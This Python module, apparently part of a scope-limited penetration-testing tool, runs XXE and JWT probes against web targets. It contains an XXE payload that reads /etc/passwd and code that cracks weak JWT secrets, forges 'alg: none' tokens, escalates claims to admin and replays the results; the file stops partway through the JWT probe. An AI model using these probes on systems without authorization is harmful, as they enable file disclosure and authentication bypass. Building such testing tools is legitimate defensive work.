from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import tempfile
from pathlib import Path
from typing import Any, Callable
from urllib.parse import urljoin, urlparse

import httpx as httpx_client

from api.app.services.runs import target_value_is_allowed
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution
from workers.runners.httpx.runner import normalize_http_target

CONTENT_DISCOVERY_RESULTS_ARTIFACT_NAME = "content-discovery-results.json"
NIKTO_RESULTS_ARTIFACT_NAME = "nikto-results.json"
SQLMAP_RESULTS_ARTIFACT_NAME = "sqlmap-results.json"
EXTERNAL_OSINT_RESULTS_ARTIFACT_NAME = "external-osint-results.json"
XXE_RESULTS_ARTIFACT_NAME = "xxe-results.json"
JWT_RESULTS_ARTIFACT_NAME = "jwt-results.json"
VULN_COMPONENTS_RESULTS_ARTIFACT_NAME = "vuln-components-results.json"

DEFAULT_CONTENT_WORDS = (
    "admin",
    "api",
    "backup",
    "config",
    "debug",
    "login",
    "old",
    "private",
    "server-status",
    "test",
)

XXE_DIRECT_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aegispt [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<aegispt><probe>&xxe;</probe></aegispt>
"""

JWT_PATTERN = re.compile(r"(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*)(?![A-Za-z0-9_-])")
SCRIPT_SRC_PATTERN = re.compile(r"<script[^>]+src=[\"']([^\"']+)[\"']", re.IGNORECASE)
HTML_COMMENT_PATTERN = re.compile(r"<!--(?P<body>.*?)-->", re.IGNORECASE | re.DOTALL)
VERSION_PATTERNS = {
    "jquery": (
        re.compile(r"\bjquery[^0-9]{0,48}(?P<version>\d+\.\d+(?:\.\d+)*)", re.IGNORECASE),
        re.compile(r"\bjQuery\s+v(?P<version>\d+\.\d+(?:\.\d+)*)", re.IGNORECASE),
    ),
    "bootstrap": (
        re.compile(r"\bbootstrap[^0-9]{0,48}(?P<version>\d+\.\d+(?:\.\d+)*)", re.IGNORECASE),
        re.compile(r"\bBootstrap\s+v(?P<version>\d+\.\d+(?:\.\d+)*)", re.IGNORECASE),
    ),
    "spring": (
        re.compile(r"\bspring[^0-9]{0,64}(?P<version>\d+\.\d+(?:\.\d+)*(?:\.RELEASE)?)", re.IGNORECASE),
    ),
    "apache struts": (
        re.compile(r"\b(?:apache\s+)?struts[^0-9]{0,48}(?P<version>\d+\.\d+(?:\.\d+)*)", re.IGNORECASE),
    ),
    "express": (
        re.compile(r"\bexpress/(?P<version>\d+\.\d+(?:\.\d+)*)", re.IGNORECASE),
    ),
    "apache httpd": (
        re.compile(r"\bapache/(?P<version>\d+\.\d+(?:\.\d+)*)", re.IGNORECASE),
    ),
    "nginx": (
        re.compile(r"\bnginx/(?P<version>\d+\.\d+(?:\.\d+)*)", re.IGNORECASE),
    ),
    "asp.net": (
        re.compile(r"\b(?:asp\.net|x-aspnet-version)[:/\s]+(?P<version>\d+\.\d+(?:\.\d+)*)", re.IGNORECASE),
    ),
}
DEPENDENCY_FILE_PATHS = (
    "package.json",
    "package-lock.json",
    "yarn.lock",
    "pom.xml",
    "build.gradle",
)
JWT_WEAK_SECRET_CANDIDATES = (
    "secret",
    "password",
    "123456",
    "admin",
    "jwt",
    "changeme",
    "default",
    "test",
    "webgoat",
    "aegispt",
)
JWT_HMAC_ALGORITHMS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}

CommandRunner = Callable[..., subprocess.CompletedProcess[str]]


def _run_command(command: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
    return subprocess.run(command, **kwargs)


def _json_artifact(name: str, payload: dict[str, Any], *, kind: str = "runner-results") -> EvidenceArtifact:
    return EvidenceArtifact(
        name=name,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind=kind,
    )


def _scope_values(scope_allowlist: dict[str, Any], keys: tuple[str, ...]) -> list[str]:
    values: list[str] = []
    for key in keys:
        raw = scope_allowlist.get(key)
        if isinstance(raw, list):
            values.extend(str(item).strip() for item in raw if str(item).strip())
    return values


def _url_host(value: str) -> str:
    parsed = urlparse(value if "://" in value else f"//{value}")
    return str(parsed.hostname or "").strip().lower()


def _target_within_scope(scope_allowlist: dict[str, Any] | None, target: str) -> bool:
    scope = scope_allowlist or {}
    if not scope:
        return True

    candidate = normalize_http_target(target)
    candidate_host = _url_host(candidate)
    if not candidate_host:
        return False

    broad_values = _scope_values(scope, ("domains", "subdomains", "hosts", "ip_addresses"))
    if any(target_value_is_allowed({"targets": [value]}, candidate) for value in broad_values):
        return True

    url_constraints = [
        normalize_http_target(value)
        for value in _scope_values(scope, ("urls", "api_base_urls", "targets"))
        if _url_host(value) == candidate_host
    ]
    if not url_constraints:
        return target_value_is_allowed(scope, candidate)

    candidate_path = urlparse(candidate).path or "/"
    for raw_allowed in url_constraints:
        allowed = urlparse(raw_allowed)
        allowed_path = allowed.path or "/"
        if allowed_path == "/" or candidate_path == allowed_path or candidate_path.startswith(allowed_path.rstrip("/") + "/"):
            return True
    return False


def _approved_web_targets(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None,
) -> list[str]:
    normalized: list[str] = []
    seen: set[str] = set()
    for target in targets:
        if not str(target or "").strip():
            continue
        candidate = normalize_http_target(str(target).strip())
        if not _target_within_scope(scope_allowlist, candidate):
            raise ValueError(f"target outside scope: {candidate}")
        if candidate not in seen:
            seen.add(candidate)
            normalized.append(candidate)
    if not normalized:
        raise ValueError("at least one target is required")
    return normalized


def _finding(
    *,
    title: str,
    severity: str,
    target: str,
    summary: str,
    tags: list[str],
    extra: dict[str, Any] | None = None,
) -> dict[str, Any]:
    return {
        "title": title,
        "severity": severity,
        "target": target,
        "summary": summary,
        "methodology_tags": list(dict.fromkeys(tags)),
        **({"evidence": extra} if extra else {}),
    }


def _clean_component_name(value: object) -> str:
    normalized = re.sub(r"[^a-z0-9.+#-]+", " ", str(value or "").strip().lower()).strip()
    aliases = {
        "jquery": "jquery",
        "jquery js": "jquery",
        "springframework": "spring",
        "spring framework": "spring",
        "spring-web": "spring",
        "spring core": "spring",
        "struts": "apache struts",
        "struts2": "apache struts",
        "apache struts": "apache struts",
        "httpd": "apache httpd",
        "apache": "apache httpd",
        "apache http server": "apache httpd",
        "x aspnet version": "asp.net",
        "aspnet": "asp.net",
        "asp.net": "asp.net",
    }
    return aliases.get(normalized, normalized)


def _normalize_version(value: object) -> str:
    version = str(value or "").strip().strip("\"'")
    version = re.sub(r"^[~^<>=\s]+", "", version)
    version = version.split(" ", 1)[0].split(",", 1)[0]
    return version.strip()


def _component_key(component: dict[str, Any]) -> tuple[str, str, str]:
    return (
        _clean_component_name(component.get("product")),
        _normalize_version(component.get("version")),
        str(component.get("source_url") or component.get("source") or "").strip(),
    )


def _add_component(
    components: list[dict[str, Any]],
    *,
    product: str,
    version: str,
    source: str,
    source_url: str,
    evidence: str,
) -> None:
    normalized_product = _clean_component_name(product)
    normalized_version = _normalize_version(version)
    if not normalized_product or not normalized_version:
        return
    candidate = {
        "product": normalized_product,
        "version": normalized_version,
        "source": source,
        "source_url": source_url,
        "evidence": evidence[:240],
    }
    candidate_key = _component_key(candidate)
    if any(_component_key(existing) == candidate_key for existing in components):
        return
    components.append(candidate)


def _detect_versions(text: str, *, source: str, source_url: str) -> list[dict[str, Any]]:
    components: list[dict[str, Any]] = []
    for product, patterns in VERSION_PATTERNS.items():
        for pattern in patterns:
            for match in pattern.finditer(text or ""):
                _add_component(
                    components,
                    product=product,
                    version=match.group("version"),
                    source=source,
                    source_url=source_url,
                    evidence=match.group(0),
                )
    return components


def _script_urls_from_html(html: str, *, base_url: str, scope_allowlist: dict[str, Any] | None) -> list[str]:
    urls: list[str] = []
    for match in SCRIPT_SRC_PATTERN.finditer(html or ""):
        script_url = urljoin(base_url, match.group(1).strip())
        if _target_within_scope(scope_allowlist, script_url) and script_url not in urls:
            urls.append(script_url)
    return urls


def _dependency_file_urls(target: str, *, scope_allowlist: dict[str, Any] | None, paths: list[str] | None) -> list[str]:
    base = target.rstrip("/") + "/"
    urls: list[str] = []
    for raw_path in paths or list(DEPENDENCY_FILE_PATHS):
        path = str(raw_path or "").strip().lstrip("/")
        if not path or ".." in Path(path).parts:
            continue
        candidate = urljoin(base, path)
        if _target_within_scope(scope_allowlist, candidate) and candidate not in urls:
            urls.append(candidate)
    return urls


def _dependencies_from_package_json(text: str, *, source_url: str) -> list[dict[str, Any]]:
    try:
        payload = json.loads(text)
    except ValueError:
        return []
    if not isinstance(payload, dict):
        return []
    components: list[dict[str, Any]] = []
    for section in ("dependencies", "devDependencies", "peerDependencies", "optionalDependencies"):
        values = payload.get(section)
        if isinstance(values, dict):
            for product, version in values.items():
                _add_component(
                    components,
                    product=str(product),
                    version=str(version),
                    source=f"exposed-{section}",
                    source_url=source_url,
                    evidence=f"{section}.{product}={version}",
                )
    lock_dependencies = payload.get("packages") or payload.get("dependencies")
    if isinstance(lock_dependencies, dict):
        for product, metadata in lock_dependencies.items():
            if not isinstance(metadata, dict):
                continue
            version = metadata.get("version")
            clean_product = str(product).split("node_modules/")[-1]
            if version:
                _add_component(
                    components,
                    product=clean_product,
                    version=str(version),
                    source="exposed-lockfile",
                    source_url=source_url,
                    evidence=f"{clean_product}@{version}",
                )
    return components


def _dependencies_from_yarn_lock(text: str, *, source_url: str) -> list[dict[str, Any]]:
    components: list[dict[str, Any]] = []
    current_products: list[str] = []
    for line in (text or "").splitlines():
        if line and not line.startswith((" ", "\t")) and line.endswith(":"):
            current_products = []
            for item in line.rstrip(":").split(","):
                product = item.strip().strip("\"'").split("@", 1)[0]
                if product:
                    current_products.append(product)
            continue
        version_match = re.search(r"\bversion\s+[\"'](?P<version>[^\"']+)", line)
        if version_match:
            for product in current_products:
                _add_component(
                    components,
                    product=product,
                    version=version_match.group("version"),
                    source="exposed-yarn-lock",
                    source_url=source_url,
                    evidence=line.strip(),
                )
    return components


def _dependencies_from_pom_xml(text: str, *, source_url: str) -> list[dict[str, Any]]:
    components: list[dict[str, Any]] = []
    for match in re.finditer(
        r"<artifactId>\s*(?P<artifact>[^<]+)\s*</artifactId>\s*<version>\s*(?P<version>[^<]+)\s*</version>",
        text or "",
        re.IGNORECASE | re.DOTALL,
    ):
        _add_component(
            components,
            product=match.group("artifact"),
            version=match.group("version"),
            source="exposed-pom",
            source_url=source_url,
            evidence=match.group(0),
        )
    return components


def _dependencies_from_build_gradle(text: str, *, source_url: str) -> list[dict[str, Any]]:
    components: list[dict[str, Any]] = []
    for match in re.finditer(
        r"['\"](?P<group>[a-z0-9_.-]+):(?P<artifact>[a-z0-9_.-]+):(?P<version>[^'\"]+)['\"]",
        text or "",
        re.IGNORECASE,
    ):
        _add_component(
            components,
            product=match.group("artifact"),
            version=match.group("version"),
            source="exposed-gradle",
            source_url=source_url,
            evidence=match.group(0),
        )
    return components


def _dependencies_from_exposed_file(text: str, *, source_url: str) -> list[dict[str, Any]]:
    path = urlparse(source_url).path.lower()
    if path.endswith((".json", "package-lock.json", "package.json")):
        return _dependencies_from_package_json(text, source_url=source_url)
    if path.endswith("yarn.lock"):
        return _dependencies_from_yarn_lock(text, source_url=source_url)
    if path.endswith("pom.xml"):
        return _dependencies_from_pom_xml(text, source_url=source_url)
    if path.endswith(("build.gradle", "build.gradle.kts")):
        return _dependencies_from_build_gradle(text, source_url=source_url)
    return []


def _compact_cve_record(raw: dict[str, Any]) -> dict[str, Any]:
    cve_id = str(raw.get("cve_id") or raw.get("advisory_id") or raw.get("id") or "").strip().upper()
    return {
        "cve_id": cve_id,
        "title": str(raw.get("title") or cve_id).strip(),
        "summary": str(raw.get("summary") or raw.get("description") or "").strip(),
        "severity": str(raw.get("severity") or "").strip().lower() or "medium",
        "affected_products": list(raw.get("affected_products") or raw.get("affected_products_json") or []),
        "affected_versions": list(raw.get("affected_versions") or raw.get("affected_versions_json") or []),
        "product_match_hints": list(raw.get("product_match_hints") or raw.get("product_match_hints_json") or []),
        "references": list(raw.get("references") or raw.get("references_json") or []),
        "source": str(raw.get("source") or "local-cache").strip(),
    }


def _version_matches(component_version: str, affected_versions: list[Any], haystack: str) -> bool:
    version = _normalize_version(component_version).lower()
    if not version:
        return False
    if not affected_versions:
        return version in haystack
    for raw in affected_versions:
        affected = str(raw or "").strip().lower()
        if not affected:
            continue
        if affected == version or version in affected or affected in version:
            return True
    return version in haystack


def _match_local_cves(component: dict[str, Any], local_cve_records: list[dict[str, Any]]) -> list[dict[str, Any]]:
    product = _clean_component_name(component.get("product"))
    version = _normalize_version(component.get("version"))
    matches: list[dict[str, Any]] = []
    for raw in local_cve_records:
        if not isinstance(raw, dict):
            continue
        record = _compact_cve_record(raw)
        if not record["cve_id"]:
            continue
        product_terms = [
            _clean_component_name(item)
            for item in [
                *record["affected_products"],
                *record["product_match_hints"],
                record["title"],
                record["summary"],
            ]
        ]
        haystack = " ".join(
            str(item or "").lower()
            for item in [
                record["title"],
                record["summary"],
                *record["affected_products"],
                *record["product_match_hints"],
                *record["affected_versions"],
            ]
        )
        product_match = product and (
            product in product_terms or any(product in term or term in product for term in product_terms if term)
        )
        if not product_match:
            continue
        if not _version_matches(version, record["affected_versions"], haystack):
            continue
        matches.append(record)
    matches.sort(key=lambda item: (item["severity"], item["cve_id"]))
    return matches


def _severity_from_cves(cves: list[dict[str, Any]]) -> str:
    order = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
    best = "medium"
    for cve in cves:
        severity = str(cve.get("severity") or "").lower()
        if order.get(severity, -1) > order.get(best, -1):
            best = severity
    return best


def _base64url_decode(value: str) -> bytes:
    padding = "=" * (-len(value) % 4)
    return base64.urlsafe_b64decode((value + padding).encode("ascii"))


def _base64url_encode(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).decode("ascii").rstrip("=")


def _jwt_json_segment(value: str) -> dict[str, Any] | None:
    try:
        decoded = json.loads(_base64url_decode(value).decode("utf-8"))
    except (ValueError, UnicodeDecodeError):
        return None
    return decoded if isinstance(decoded, dict) else None


def _parse_jwt(token: str) -> dict[str, Any] | None:
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    header = _jwt_json_segment(parts[0])
    payload = _jwt_json_segment(parts[1])
    if header is None or payload is None:
        return None
    alg = str(header.get("alg") or "").strip()
    return {
        "token": token,
        "header": header,
        "payload": payload,
        "alg": alg,
        "signing_input": f"{parts[0]}.{parts[1]}".encode("ascii"),
        "signature": _base64url_decode(parts[2]) if parts[2] else b"",
    }


def _jwt_fingerprint(token: str) -> str:
    return hashlib.sha256(token.encode("utf-8")).hexdigest()[:16]


def _mask_secret(secret: str) -> str:
    if len(secret) <= 2:
        return "*" * len(secret)
    if len(secret) <= 6:
        return f"{secret[:1]}***{secret[-1:]}"
    return f"{secret[:2]}***{secret[-2:]}"


def _hmac_signature(*, alg: str, signing_input: bytes, secret: str) -> bytes | None:
    digest = JWT_HMAC_ALGORITHMS.get(alg.upper())
    if digest is None:
        return None
    return hmac.new(secret.encode("utf-8"), signing_input, digest).digest()


def _verify_hmac_jwt(parsed: dict[str, Any], secret: str) -> bool:
    signature = _hmac_signature(
        alg=str(parsed["alg"]),
        signing_input=parsed["signing_input"],
        secret=secret,
    )
    return signature is not None and hmac.compare_digest(signature, parsed["signature"])


def _sign_jwt(*, header: dict[str, Any], payload: dict[str, Any], secret: str, alg: str) -> str:
    safe_header = {**header, "alg": alg}
    encoded_header = _base64url_encode(
        json.dumps(safe_header, separators=(",", ":"), sort_keys=True).encode("utf-8")
    )
    encoded_payload = _base64url_encode(
        json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8")
    )
    signing_input = f"{encoded_header}.{encoded_payload}".encode("ascii")
    signature = _hmac_signature(alg=alg, signing_input=signing_input, secret=secret)
    if signature is None:
        raise ValueError(f"unsupported HMAC JWT algorithm: {alg}")
    return f"{encoded_header}.{encoded_payload}.{_base64url_encode(signature)}"


def _none_jwt(*, header: dict[str, Any], payload: dict[str, Any]) -> str:
    safe_header = {**header, "alg": "none"}
    encoded_header = _base64url_encode(
        json.dumps(safe_header, separators=(",", ":"), sort_keys=True).encode("utf-8")
    )
    encoded_payload = _base64url_encode(
        json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8")
    )
    return f"{encoded_header}.{encoded_payload}."


def _jwt_tokens_from_text(text: str) -> list[str]:
    candidates: list[str] = []
    seen: set[str] = set()
    for match in JWT_PATTERN.finditer(text or ""):
        token = match.group(1)
        if token in seen or _parse_jwt(token) is None:
            continue
        seen.add(token)
        candidates.append(token)
    return candidates


def _jwt_secret_candidates(targets: list[str], configured_secrets: list[str] | None) -> list[str]:
    values: list[str] = [*JWT_WEAK_SECRET_CANDIDATES]
    for target in targets:
        host = _url_host(target)
        if host:
            values.extend(part for part in host.split(".") if part)
    if isinstance(configured_secrets, list):
        values.extend(str(secret).strip() for secret in configured_secrets if str(secret).strip())
    bounded = [value for value in dict.fromkeys(values) if value]
    return bounded[:24]


def _record_jwt_token(
    records: list[dict[str, Any]],
    raw_tokens: dict[str, str],
    *,
    token: str,
    source_url: str,
    source_type: str,
) -> None:
    parsed = _parse_jwt(token)
    if parsed is None:
        return
    fingerprint = _jwt_fingerprint(token)
    if fingerprint in raw_tokens:
        return
    raw_tokens[fingerprint] = token
    records.append(
        {
            "fingerprint": fingerprint,
            "source_url": source_url,
            "source_type": source_type,
            "alg": parsed["alg"],
            "header_keys": sorted(str(key) for key in parsed["header"].keys()),
            "claim_keys": sorted(str(key) for key in parsed["payload"].keys()),
        }
    )


def _extract_jwt_sources_from_evidence(
    evidence_records: list[dict[str, Any] | str] | None,
    token_records: list[dict[str, Any]],
    raw_tokens: dict[str, str],
) -> None:
    records = evidence_records if isinstance(evidence_records, list) else []
    for item in records:
        if isinstance(item, str):
            text = item
            source_url = "provided-evidence"
        elif isinstance(item, dict):
            text = " ".join(
                str(item.get(key) or "")
                for key in ("body", "text", "response_body", "javascript", "source", "headers")
            )
            source_url = str(item.get("url") or item.get("target") or item.get("endpoint") or "provided-evidence")
        else:
            continue
        for token in _jwt_tokens_from_text(text):
            _record_jwt_token(
                token_records,
                raw_tokens,
                token=token,
                source_url=source_url,
                source_type="evidence",
            )


def _configured_jwks_endpoints(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None,
    jwks_endpoints: list[str] | None,
) -> list[str]:
    candidates: list[str] = []
    if isinstance(jwks_endpoints, list):
        candidates.extend(str(endpoint).strip() for endpoint in jwks_endpoints if str(endpoint).strip())
    for target in targets:
        root_jwks = urljoin(normalize_http_target(target), "/.well-known/jwks.json")
        if _target_within_scope(scope_allowlist, root_jwks):
            candidates.append(root_jwks)
    normalized: list[str] = []
    seen: set[str] = set()
    for endpoint in candidates:
        candidate = normalize_http_target(endpoint)
        if not _target_within_scope(scope_allowlist, candidate):
            raise ValueError(f"JWKS endpoint outside scope: {candidate}")
        if candidate not in seen:
            seen.add(candidate)
            normalized.append(candidate)
    return normalized


def _jwks_private_key_exposed(jwk: dict[str, Any]) -> bool:
    private_fields = {"d", "p", "q", "dp", "dq", "qi", "oth"}
    if any(field in jwk for field in private_fields):
        return True
    material = json.dumps(jwk, sort_keys=True)
    return "PRIVATE KEY" in material


def _accepted_replay(response: Any, context: dict[str, Any]) -> bool:
    text = str(getattr(response, "text", "") or "")
    success_markers = [
        str(marker)
        for marker in context.get("success_markers", [])
        if isinstance(marker, str) and marker
    ]
    reject_markers = [
        str(marker)
        for marker in context.get("reject_markers", [])
        if isinstance(marker, str) and marker
    ]
    if any(marker in text for marker in reject_markers):
        return False
    if success_markers:
        return any(marker in text for marker in success_markers)
    accepted_status_codes = [
        int(code)
        for code in context.get("accepted_status_codes", [])
        if isinstance(code, int)
    ]
    return bool(accepted_status_codes and response.status_code in accepted_status_codes)


def _replay_jwt(
    client: Any,
    *,
    context: dict[str, Any],
    token: str,
    scope_allowlist: dict[str, Any] | None,
) -> dict[str, Any]:
    endpoint = str(context.get("url") or context.get("endpoint") or context.get("target") or "").strip()
    if not endpoint:
        return {"status": "skipped", "reason": "missing replay endpoint"}
    endpoint = normalize_http_target(endpoint)
    if not _target_within_scope(scope_allowlist, endpoint):
        raise ValueError(f"JWT replay endpoint outside scope: {endpoint}")
    method = str(context.get("method") or "GET").upper()
    if method not in {"GET", "POST"}:
        return {"endpoint": endpoint, "status": "skipped", "reason": f"unsupported method {method}"}

    placement = str(context.get("placement") or "authorization_bearer").strip().lower()
    headers: dict[str, str] = {}
    cookies: dict[str, str] = {}
    params: dict[str, str] = {}
    json_body: dict[str, str] | None = None
    if placement in {"authorization", "authorization_bearer", "bearer", "header"}:
        header_name = str(context.get("header_name") or "Authorization")
        header_value = (
            str(context.get("header_template")).replace("{token}", token)
            if context.get("header_template")
            else f"Bearer {token}"
        )
        headers[header_name] = header_value
    elif placement == "cookie":
        cookies[str(context.get("cookie_name") or "jwt")] = token
    elif placement == "query":
        params[str(context.get("query_parameter") or "token")] = token
    elif placement == "body_json":
        json_body = {str(context.get("body_parameter") or "token"): token}
    else:
        return {"endpoint": endpoint, "status": "skipped", "reason": f"unsupported placement {placement}"}

    request_kwargs: dict[str, Any] = {"headers": headers}
    if cookies:
        request_kwargs["cookies"] = cookies
    if params:
        request_kwargs["params"] = params
    if method == "GET":
        response = client.get(endpoint, **request_kwargs)
    else:
        response = client.post(endpoint, json=json_body, **request_kwargs)
    return {
        "endpoint": endpoint,
        "status": "checked",
        "status_code": response.status_code,
        "accepted": _accepted_replay(response, context),
        "placement": placement,
    }


def _claim_mutation(payload: dict[str, Any]) -> dict[str, Any] | None:
    mutated = dict(payload)
    changed = False
    for key in ("role", "roles"):
        if key in mutated and mutated[key] != "admin":
            mutated[key] = "admin"
            changed = True
    for key in ("admin", "is_admin", "isAdmin"):
        if key in mutated and mutated[key] is not True:
            mutated[key] = True
            changed = True
    for key in ("user_id", "uid", "sub"):
        if key in mutated and str(mutated[key]) not in {"1", "admin"}:
            mutated[key] = "1"
            changed = True
    return mutated if changed else None


def _content_discovery_severity(status_code: int, url: str) -> str:
    lowered = url.lower()
    if status_code in {401, 403} or any(token in lowered for token in ("admin", "backup", "config")):
        return "medium"
    if status_code in {500, 502, 503}:
        return "low"
    return "info"


def _write_default_wordlist(directory: Path) -> Path:
    path = directory / "aegispt-content-words.txt"
    path.write_text("\n".join(DEFAULT_CONTENT_WORDS) + "\n", encoding="utf-8")
    return path


def _content_wordlist_path(configured_path: str | None, directory: Path) -> Path:
    if configured_path:
        candidate = Path(configured_path).expanduser()
        if candidate.exists():
            return candidate
    for candidate in (
        Path("/usr/share/wordlists/dirb/common.txt"),
        Path("/usr/share/seclists/Discovery/Web-Content/common.txt"),
    ):
        if candidate.exists():
            return candidate
    return _write_default_wordlist(directory)


def _xml_endpoint_hints_from_evidence(raw_items: Any) -> list[str]:
    items = raw_items if isinstance(raw_items, list) else []
    endpoints: list[str] = []
    for item in items:
        if isinstance(item, str):
            if item.strip():
                endpoints.append(item.strip())
            continue
        if not isinstance(item, dict):
            continue
        url = str(item.get("url") or item.get("target") or item.get("endpoint") or "").strip()
        if not url:
            continue
        haystack = " ".join(
            str(value or "")
            for value in (
                item.get("content_type"),
                item.get("request_content_type"),
                item.get("response_content_type"),
                item.get("method"),
                item.get("request_body"),
                item.get("body"),
            )
        ).lower()
        path = urlparse(url).path.lower()
        if (
            "application/xml" in haystack
            or "text/xml" in haystack
            or "<?xml" in haystack
            or path.endswith((".xml", ".svg"))
        ):
            endpoints.append(url)
    return endpoints


def _candidate_xml_endpoints(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None,
    xml_endpoints: list[dict[str, Any] | str] | None = None,
    evidence_records: list[dict[str, Any] | str] | None = None,
) -> list[str]:
    candidates: list[str] = []
    candidates.extend(_xml_endpoint_hints_from_evidence(xml_endpoints or []))
    candidates.extend(_xml_endpoint_hints_from_evidence(evidence_records or []))
    candidates.extend(_approved_web_targets(targets, scope_allowlist=scope_allowlist))

    normalized: list[str] = []
    seen: set[str] = set()
    for raw_candidate in candidates:
        candidate = normalize_http_target(str(raw_candidate).strip())
        if not _target_within_scope(scope_allowlist, candidate):
            raise ValueError(f"XML endpoint outside scope: {candidate}")
        if candidate not in seen:
            seen.add(candidate)
            normalized.append(candidate)
    if not normalized:
        raise ValueError("xxe-probe requires at least one in-scope XML-capable target")
    return normalized


def _xxe_direct_file_read_detected(response_text: str) -> bool:
    lowered = response_text.lower()
    return bool(
        "root:x:0:0:" in lowered
        or re.search(r"(?m)^[a-z0-9_-]+:x:\d+:\d+:", response_text)
        or ("/bin/" in lowered and "daemon:" in lowered)
    )


def _xxe_direct_finding(endpoint: str, response_text: str) -> dict[str, Any]:
    evidence_excerpt = response_text[:1200]
    return _finding(
        title="XXE - File Read Possible (Direct)",
        severity="critical",
        target=endpoint,
        summary=(
            "The approved XML endpoint echoed Unix password-file markers after a "
            "read-only external entity probe, indicating direct XML External Entity file-read exposure."
        ),
        tags=["xxe", "xml", "owasp-wstg", "input_validation"],
        extra={
            "probe_type": "direct-file-read",
            "file_uri": "file:///etc/passwd",
            "matched_marker": "passwd-style-account-line",
            "response_excerpt": evidence_excerpt,
        },
    )


def _xxe_oob_findings(
    *,
    endpoint: str,
    oob_confirmation_refs: list[dict[str, Any]] | None,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    refs = oob_confirmation_refs if isinstance(oob_confirmation_refs, list) else []
    for ref in refs:
        if not isinstance(ref, dict):
            continue
        ref_endpoint = str(ref.get("endpoint") or ref.get("target") or endpoint).strip()
        if ref_endpoint and ref_endpoint != endpoint:
            continue
        token = str(ref.get("token") or ref.get("interaction_id") or "oob-interaction").strip()
        findings.append(
            _finding(
                title="XXE - Blind Out-of-Band Detected",
                severity="critical",
                target=endpoint,
                summary=(
                    "Out-of-band interaction evidence was provided for an approved XML endpoint, "
                    "indicating blind XML External Entity resolution."
                ),
                tags=["xxe", "xml", "oob", "owasp-wstg", "input_validation"],
                extra={"probe_type": "blind-oob", "interaction_ref": token, "source": "provided-oob-evidence"},
            )
        )
    return findings


def execute_xxe_probe(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    xml_endpoints: list[dict[str, Any] | str] | None = None,
    evidence_records: list[dict[str, Any] | str] | None = None,
    oob_confirmation_refs: list[dict[str, Any]] | None = None,
    timeout_seconds: float = 30.0,
    client_factory: Callable[..., Any] = httpx_client.Client,
) -> RunnerExecution:
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")
    endpoints = _candidate_xml_endpoints(
        targets,
        scope_allowlist=scope_allowlist,
        xml_endpoints=xml_endpoints,
        evidence_records=evidence_records,
    )

    results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0
    headers = {"Content-Type": "application/xml", "Accept": "application/xml,text/xml,text/plain,*/*"}

    with client_factory(timeout=timeout_seconds, follow_redirects=True) as client:
        for endpoint in endpoints:
            try:
                response = client.post(endpoint, content=XXE_DIRECT_PAYLOAD.encode("utf-8"), headers=headers)
                response_text = response.text or ""
                detected = _xxe_direct_file_read_detected(response_text)
                result = {
                    "endpoint": endpoint,
                    "status_code": response.status_code,
                    "probe_type": "direct-file-read",
                    "detected": detected,
                    "content_type": response.headers.get("content-type", ""),
                    "response_excerpt": response_text[:1200],
                }
                results.append(result)
                if detected:
                    findings.append(_xxe_direct_finding(endpoint, response_text))
            except httpx_client.HTTPError as exc:
                exit_code = 1
                stderr_lines.append(f"{endpoint}: {exc}")
                results.append({"endpoint": endpoint, "probe_type": "direct-file-read", "status": "error", "error": str(exc)})
            findings.extend(_xxe_oob_findings(endpoint=endpoint, oob_confirmation_refs=oob_confirmation_refs))

    artifact_payload = {
        "results": results,
        "findings": findings,
        "summary": {
            "endpoint_count": len(endpoints),
            "finding_count": len(findings),
            "direct_file_read_count": sum(1 for result in results if result.get("detected")),
            "dos_payloads_sent": 0,
        },
        "safety": {
            "dos_payloads_sent": False,
            "ssrf_chaining": False,
            "payload_family": "read-only-file-uri",
        },
    }
    return RunnerExecution(
        tool="xxe-probe",
        exit_code=exit_code,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.web_depth.xxe:v1",
            "tool_version": "httpx-python",
            "finding_count": len(findings),
            "endpoint_count": len(endpoints),
            "dos_payloads_sent": False,
        },
        artifacts=[_json_artifact(XXE_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )


def execute_jwt_probe(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    evidence_records: list[dict[str, Any] | str] | None = None,
    jwt_tokens: list[str] | None = None,
    replay_contexts: list[dict[str, Any]] | None = None,
    public_key_materials: list[str] | None = None,
    jwks_endpoints: list[str] | None = None,
    weak_secrets: list[str] | None = None,
    timeout_seconds: float = 30.0,
    client_factory: Callable[..., Any] = httpx_client.Client,
) -> RunnerExecution:
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")
    normalized_targets = _approved_web_targets(targets, scope_allowlist=scope_allowlist)
    configured_replay_contexts = replay_contexts if isinstance(replay_contexts, list) else []
    explicit_public_keys = [
        str(key).strip()
        for key in public_key_materials or []
        if isinstance(key, str) and str(key).strip()
    ][:8]
    secret_candidates = _jwt_secret_candidates(normalized_targets, weak_secrets)

    token_records: list[dict[str, Any]] = []
    raw_tokens: dict[str, str] = {}
    jwks_results: list[dict[str, Any]] = []
